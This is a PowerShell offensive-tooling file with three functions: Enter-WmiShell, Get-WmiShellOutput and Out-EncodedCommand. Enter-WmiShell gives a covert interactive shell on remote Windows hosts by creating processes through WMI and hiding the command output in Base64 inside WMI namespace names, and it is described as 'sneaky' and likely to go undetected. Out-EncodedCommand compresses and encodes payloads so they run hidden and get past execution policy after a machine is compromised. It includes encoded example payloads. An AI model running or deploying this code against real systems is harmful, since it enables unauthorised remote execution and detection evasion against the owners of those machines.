function Enter-WmiShell{
<#
.SYNOPSIS

Creates a limited* interactive prompt to interact with windows machines in a sneaky way, that is likely to go unnoticed/undetected. Use
the command "exit" to close and cleanup the session; not doing so will leave data in the WMI namespaces.

Author: Jesse Davis (@secabstraction)
License: BSD 3-Clause
Required Dependencies: Out-EncodedCommand, Get-WmiShellOutput
Optional Dependencies: None
 
.DESCRIPTION

Enter-WmiShell accepts cmd-type commands to be executed on remote hosts via WMI. The output of those commands is captured, Base64 encoded,
and written to Namespaces in the WMI database.
 
.PARAMETER ComputerName 

Specifies the remote host to interact with.

.PARAMETER UserName

Specifies the Domain\UserName to create a credential object for authentication, will also accept a PSCredential object. If this parameter
isn't used, the credentials of the current session will be used.

.EXAMPLE

PS C:\> Enter-WmiShell -ComputerName Server01 -UserName Administrator

[Server01]: WmiShell>whoami
Server01\Administrator

.NOTES

This cmdlet was inspired by the work of Andrei Dumitrescu's python/vbScript implementation. However, this PowerShell implementation doesn't 
write any files (vbScript) to disk.

TODO
----

Add upload/download functionality

.LINK

http://www.secabstraction.com/

#>
Param (	
    [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
    [string]
    $ComputerName,
    
    [Parameter(ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
    [ValidateNotNull()]
    [System.Management.Automation.PSCredential]
    [System.Management.Automation.Credential()]
    $UserName = [System.Management.Automation.PSCredential]::Empty,
    
    [Parameter(ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
    [string]
    $Namespace = "root\default",
    
    [Parameter(ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
    [string]
    $Tag = ([System.IO.Path]::GetRandomFileName()).Remove(8,4)

) # End Param

    # Start WmiShell prompt
    $Command = ""
    do{ 
        # Make a pretty prompt for the user to provide commands at
        Write-Host ("[" + $($ComputerName) + "]: WmiShell>") -NoNewline -ForegroundColor green 
        $Command = Read-Host

        # Execute commands on remote host 
        switch ($Command) {
            "exit" { 
                Get-WmiObject -EnableAllPrivileges -Credential $UserName -ComputerName $ComputerName -Namespace $Namespace `
                              -Query "SELECT * FROM __Namespace WHERE Name LIKE '$Tag%' OR Name LIKE 'OUTPUT_READY'" | Remove-WmiObject
            }
            default { 
                $RemoteScript = @"
Get-WmiObject -Namespace $Namespace -Query "SELECT * FROM __Namespace WHERE Name LIKE '$Tag%' OR Name LIKE 'OUTPUT_READY'" | Remove-WmiObject
`$WScriptShell = New-Object -c WScript.Shell
function Insert-Piece(`$i, `$piece) {
    `$Count = `$i.ToString()
	`$Zeros = "0" * (6 - `$Count.Length)
	`$Tag = "$Tag" + `$Zeros + `$Count
	`$Piece = `$Tag + `$piece + `$Tag
	`$null = Set-WmiInstance -EnableAll -Namespace $Namespace -Path __Namespace -PutType CreateOnly -Arguments @{Name=`$Piece}
}
`$ShellExec = `$WScriptShell.Exec("%comspec% /c" + "$Command") 
`$ShellOutput = `$ShellExec.StdOut.ReadAll()
`$WmiEncoded = ([System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes(`$ShellOutput))) -replace '\+',[char]0x00F3 -replace '/','_' -replace '=',''
`$NumberOfPieces = [Math]::Floor(`$WmiEncoded.Length / 5500)
if (`$WmiEncoded.Length -gt 5500) {
    `$LastPiece = `$WmiEncoded.Substring(`$WmiEncoded.Length - (`$WmiEncoded.Length % 5500), (`$WmiEncoded.Length % 5500))
    `$WmiEncoded = `$WmiEncoded.Remove(`$WmiEncoded.Length - (`$WmiEncoded.Length % 5500), (`$WmiEncoded.Length % 5500))
    for(`$i = 1; `$i -le `$NumberOfPieces; `$i++) { 
	    `$piece = `$WmiEncoded.Substring(0,5500)
		`$WmiEncoded = `$WmiEncoded.Substring(5500,(`$WmiEncoded.Length - 5500))
		Insert-Piece `$i `$piece
    }
    `$WmiEncoded = `$LastPiece
}
Insert-Piece (`$NumberOfPieces + 1) `$WmiEncoded 
Set-WmiInstance -EnableAll -Namespace $Namespace -Path __Namespace -PutType CreateOnly -Arguments @{Name='OUTPUT_READY'}
"@
                $ScriptBlock = [scriptblock]::Create($RemoteScript)
                $EncodedPosh = Out-EncodedCommand -NoProfile -NonInteractive -ScriptBlock $ScriptBlock
                $null = Invoke-WmiMethod -EnableAllPrivileges -ComputerName $ComputerName -Credential $UserName -Class win32_process -Name create -ArgumentList $EncodedPosh
                    
                # Wait for script to finish writing output to WMI namespaces
                $outputReady = ""
                do{$outputReady = Get-WmiObject -EnableAllPrivileges -ComputerName $ComputerName -Credential $UserName -Namespace $Namespace -Query "SELECT Name FROM __Namespace WHERE Name like 'OUTPUT_READY'"}
                until($outputReady)
                Get-WmiObject -EnableAllPrivileges -Credential $UserName -ComputerName $ComputerName -Namespace $Namespace -Query "SELECT * FROM __Namespace WHERE Name LIKE 'OUTPUT_READY'" | Remove-WmiObject
                    
                # Retrieve cmd output written to WMI namespaces 
                Get-WmiShellOutput -UserName $UserName -ComputerName $ComputerName -Namespace $Namespace -Tag $Tag
            }
        }
    }until($Command -eq "exit")
}

function Get-WmiShellOutput{
<#
.SYNOPSIS

Retrieves Base64 encoded data stored in WMI namspaces and decodes it.

Author: Jesse Davis (@secabstraction)
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: None
 
.DESCRIPTION

Get-WmiShellOutput will query the WMI namespaces of specified remote host(s) for encoded data, decode the retrieved data and write it to StdOut.
 
.PARAMETER ComputerName 

Specifies the remote host to retrieve data from.

.PARAMETER UserName

Specifies the Domain\UserName to create a credential object for authentication, will also accept a PSCredential object. If this parameter
isn't used, the credentials of the current session will be used.

.EXAMPLE

PS C:\> Get-WmiShellOutput -ComputerName Server01 -UserName Administrator

.NOTES

This cmdlet was inspired by the work of Andrei Dumitrescu's python implementation.

.LINK

http://www.secabstraction.com/

#>
Param (
    [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
    [string[]]
    $ComputerName,
    
    [Parameter(ValueFromPipelineByPropertyName = $True)]
    [ValidateNotNull()]
    [System.Management.Automation.PSCredential]
    [System.Management.Automation.Credential()]
    $UserName = [System.Management.Automation.PSCredential]::Empty,
    
    [Parameter(ValueFromPipelineByPropertyName = $True)]
    [string]
    $Namespace = "root\default",
    
    [Parameter(ValueFromPipelineByPropertyName = $True)]
    [string]
    $Tag = ([System.IO.Path]::GetRandomFileName()).Remove(8,4)
) #End Param
	
	$GetOutput = @() 
	$GetOutput = Get-WmiObject -EnableAllPrivileges -ComputerName $ComputerName -Credential $UserName -Namespace root\default `
                    -Query "SELECT Name FROM __Namespace WHERE Name like '$Tag%'" | % {$_.Name} | Sort-Object
	
	if ([BOOL]$GetOutput.Length) {
		
	    $Reconstructed = New-Object System.Text.StringBuilder

        #Decode Base64 output
		foreach ($line in $GetOutput) {
			$WmiToBase64 = $line.Remove(0,14) -replace [char]0x00F3,[char]0x002B -replace '_','/'
            $WmiToBase64 = $WmiToBase64.Remove($WmiToBase64.Length - 14, 14)
	        $null = $Reconstructed.Append($WmiToBase64)
        }
        if ($Reconstructed.ToString().Length % 4 -ne 0) { $null = $Reconstructed.Append(("===").Substring(0, 4 - ($Reconstructed.ToString().Length % 4))) }
        $Decoded = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($Reconstructed.ToString()))
        Write-Host $Decoded
    }	

	else { #Decode single line Base64
		$GetString = $GetOutput.Name
		$WmiToBase64 = $GetString.Remove(0,14) -replace [char]0x00F3,[char]0x002B -replace '_','/'
		if ($WmiToBase64.length % 4 -ne 0) { $WmiToBase64 += ("===").Substring(0,4 - ($WmiToBase64.Length % 4)) }
        $DecodedOutput = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($WmiToBase64))
		Write-Host $DecodedOutput    
    }
}

function Out-EncodedCommand {
<#
.SYNOPSIS

Compresses, Base-64 encodes, and generates command-line output for a PowerShell payload script.

PowerSploit Function: Out-EncodedCommand
Author: Matthew Graeber (@mattifestation)
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: None
 
.DESCRIPTION

Out-EncodedCommand prepares a PowerShell script such that it can be pasted into a command prompt. The scenario for using this tool is the following: You compromise a machine, have a shell and want to execute a PowerShell script as a payload. This technique eliminates the need for an interactive PowerShell 'shell' and it bypasses any PowerShell execution policies.

.PARAMETER ScriptBlock

Specifies a scriptblock containing your payload.

.PARAMETER Path

Specifies the path to your payload.

.PARAMETER NoExit

Outputs the option to not exit after running startup commands.

.PARAMETER NoProfile

Outputs the option to not load the Windows PowerShell profile.

.PARAMETER NonInteractive

Outputs the option to not present an interactive prompt to the user.

.PARAMETER Wow64

Calls the x86 (Wow64) version of PowerShell on x86_64 Windows installations.

.PARAMETER WindowStyle

Outputs the option to set the window style to Normal, Minimized, Maximized or Hidden.

.PARAMETER EncodedOutput

Base-64 encodes the entirety of the output. This is usually unnecessary and effectively doubles the size of the output. This option is only for those who are extra paranoid.

.EXAMPLE

C:\PS> Out-EncodedCommand -ScriptBlock {Write-Host 'hello, world!'}

powershell -C sal a New-Object;iex(a IO.StreamReader((a IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String('Cy/KLEnV9cgvLlFQz0jNycnXUSjPL8pJUVQHAA=='),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()

.EXAMPLE

C:\PS> Out-EncodedCommand -Path C:\EvilPayload.ps1 -NonInteractive -NoProfile -WindowStyle Hidden -EncodedOutput

powershell -NoP -NonI -W Hidden -E cwBhAGwAIABhACAATgBlAHcALQBPAGIAagBlAGMAdAA7AGkAZQB4ACgAYQAgAEkATwAuAFMAdAByAGUAYQBtAFIAZQBhAGQAZQByACgAKABhACAASQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAC4ARABlAGYAbABhAHQAZQBTAHQAcgBlAGEAbQAoAFsASQBPAC4ATQBlAG0AbwByAHkAUwB0AHIAZQBhAG0AXQBbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACcATABjAGkAeABDAHMASQB3AEUAQQBEAFEAWAAzAEUASQBWAEkAYwBtAEwAaQA1AEsAawBGAEsARQA2AGwAQgBCAFIAWABDADgAaABLAE8ATgBwAEwAawBRAEwANAAzACsAdgBRAGgAdQBqAHkAZABBADkAMQBqAHEAcwAzAG0AaQA1AFUAWABkADAAdgBUAG4ATQBUAEMAbQBnAEgAeAA0AFIAMAA4AEoAawAyAHgAaQA5AE0ANABDAE8AdwBvADcAQQBmAEwAdQBYAHMANQA0ADEATwBLAFcATQB2ADYAaQBoADkAawBOAHcATABpAHMAUgB1AGEANABWAGEAcQBVAEkAagArAFUATwBSAHUAVQBsAGkAWgBWAGcATwAyADQAbgB6AFYAMQB3ACsAWgA2AGUAbAB5ADYAWgBsADIAdAB2AGcAPQA9ACcAKQAsAFsASQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAE0AbwBkAGUAXQA6ADoARABlAGMAbwBtAHAAcgBlAHMAcwApACkALABbAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkAKQAuAFIAZQBhAGQAVABvAEUAbgBkACgAKQA=

Description
-----------
Execute the above payload for the lulz. >D

.NOTES

This cmdlet was inspired by the createcmd.ps1 script introduced during Dave Kennedy and Josh Kelley's talk, "PowerShell...OMFG" (https://www.trustedsec.com/files/PowerShell_PoC.zip)

.LINK

http://www.exploit-monday.com
#>

    [CmdletBinding( DefaultParameterSetName = 'FilePath')] Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ParameterSetName = 'ScriptBlock' )]
        [ValidateNotNullOrEmpty()]
        [ScriptBlock]
        $ScriptBlock,

        [Parameter(Position = 0, ParameterSetName = 'FilePath' )]
        [ValidateNotNullOrEmpty()]
        [String]
        $Path,

        [Switch]
        $NoExit,

        [Switch]
        $NoProfile,

        [Switch]
        $NonInteractive,

        [Switch]
        $Wow64,

        [ValidateSet('Normal', 'Minimized', 'Maximized', 'Hidden')]
        [String]
        $WindowStyle,

        [Switch]
        $EncodedOutput
    )

    if ($PSBoundParameters['Path'])
    {
        Get-ChildItem $Path -ErrorAction Stop | Out-Null
        $ScriptBytes = [IO.File]::ReadAllBytes((Resolve-Path $Path))
    }
    else
    {
        $ScriptBytes = ([Text.Encoding]::ASCII).GetBytes($ScriptBlock)
    }

    $CompressedStream = New-Object IO.MemoryStream
    $DeflateStream = New-Object IO.Compression.DeflateStream ($CompressedStream, [IO.Compression.CompressionMode]::Compress)
    $DeflateStream.Write($ScriptBytes, 0, $ScriptBytes.Length)
    $DeflateStream.Dispose()
    $CompressedScriptBytes = $CompressedStream.ToArray()
    $CompressedStream.Dispose()
    $EncodedCompressedScript = [Convert]::ToBase64String($CompressedScriptBytes)

    # Generate the code that will decompress and execute the payload.
    # This code is intentionally ugly to save space.
    $NewScript = 'sal a New-Object;iex(a IO.StreamReader((a IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String(' + "'$EncodedCompressedScript'" + '),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()'

    # Base-64 strings passed to -EncodedCommand must be unicode encoded.
    $UnicodeEncoder = New-Object System.Text.UnicodeEncoding
    $EncodedPayloadScript = [Convert]::ToBase64String($UnicodeEncoder.GetBytes($NewScript))

    # Build the command line options
    # Use the shortest possible command-line arguments to save space. Thanks @obscuresec for the idea.
    $CommandlineOptions = New-Object String[](0)
    if ($PSBoundParameters['NoExit'])
    { $CommandlineOptions += '-NoE' }
    if ($PSBoundParameters['NoProfile'])
    { $CommandlineOptions += '-NoP' }
    if ($PSBoundParameters['NonInteractive'])
    { $CommandlineOptions += '-NonI' }
    if ($PSBoundParameters['WindowStyle'])
    { $CommandlineOptions += "-W $($PSBoundParameters['WindowStyle'])" }

    $CmdMaxLength = 8190

    # Build up the full command-line string. Default to outputting a fully base-64 encoded command.
    # If the fully base-64 encoded output exceeds the cmd.exe character limit, fall back to partial
    # base-64 encoding to save space. Thanks @Carlos_Perez for the idea.
    if ($PSBoundParameters['Wow64'])
    {
        $CommandLineOutput = "$($Env:windir)\SysWOW64\WindowsPowerShell\v1.0\powershell.exe $($CommandlineOptions -join ' ') -C `"$NewScript`""

        if ($PSBoundParameters['EncodedOutput'] -or $CommandLineOutput.Length -le $CmdMaxLength)
        {
            $CommandLineOutput = "$($Env:windir)\SysWOW64\WindowsPowerShell\v1.0\powershell.exe $($CommandlineOptions -join ' ') -E `"$EncodedPayloadScript`""
        }

        if (($CommandLineOutput.Length -gt $CmdMaxLength) -and (-not $PSBoundParameters['EncodedOutput']))
        {
            $CommandLineOutput = "$($Env:windir)\SysWOW64\WindowsPowerShell\v1.0\powershell.exe $($CommandlineOptions -join ' ') -C `"$NewScript`""
        }
    }
    else
    {
        $CommandLineOutput = "powershell $($CommandlineOptions -join ' ') -C `"$NewScript`""

        if ($PSBoundParameters['EncodedOutput'] -or $CommandLineOutput.Length -le $CmdMaxLength)
        {
            $CommandLineOutput = "powershell $($CommandlineOptions -join ' ') -E `"$EncodedPayloadScript`""
        }

        if (($CommandLineOutput.Length -gt $CmdMaxLength) -and (-not $PSBoundParameters['EncodedOutput']))
        {
            $CommandLineOutput = "powershell $($CommandlineOptions -join ' ') -C `"$NewScript`""
        }
    }

    if ($CommandLineOutput.Length -gt $CmdMaxLength)
    {
            Write-Warning 'This command exceeds the cmd.exe maximum allowed length!'
    }

    Write-Output $CommandLineOutput
}
